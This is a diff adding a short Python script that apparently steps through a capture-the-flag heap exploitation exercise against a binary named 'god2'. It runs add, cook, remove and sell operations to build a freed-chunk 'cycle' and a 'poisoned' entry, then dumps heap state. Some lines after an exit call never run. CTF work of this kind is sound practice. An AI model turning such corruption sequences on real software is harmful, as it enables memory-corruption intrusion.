@@ -1,0 +1,20 @@
+import sys,os; sys.path.insert(0,'/mnt/c/Users/ha/Downloads/pwn')
+from dumper import G
+g=G('god2')
+g.add(b'UNIQ777')
+g.add(b'A1'); g.add(b'B2'); g.cook(b'Beef noodles'); g.add(b'YY'); g.add(b'Z9'); g.cook(b'Beef noodles')
+for t in (b'B2',b'Z9',b'A1',b'YY'): g.rm(t)
+g.add(b'CC')
+g.cook(b'Beef noodles'); g.cook(b'Beef noodles'); g.cook(b'UNIQ777')
+g.add(b'R'*16+b'A'); g.add(b'SLOTXX')
+g.sell(b'2'); g.rm(b'UNIQ777'); g.rm(b'UNIQ777')
+g.sell(b'0'); g.sell(b'2')      # cycle
+g.add(b'FD1234')                # poisoned tail add (placeholder title)
+import sys
+if len(sys.argv)>1 and sys.argv[1]=='cook':
+    g.cook(b"Beef noodles")      # cook an EARLY node
+    g.dump("after cook1"); g.close(); sys.exit()
+    g.cook(b'FD1234')           # cook3: pop D3
+    g.dump('after 3 cooks'); g.close()
+else:
+    g.dump('after FD (pre cook)'); g.close()
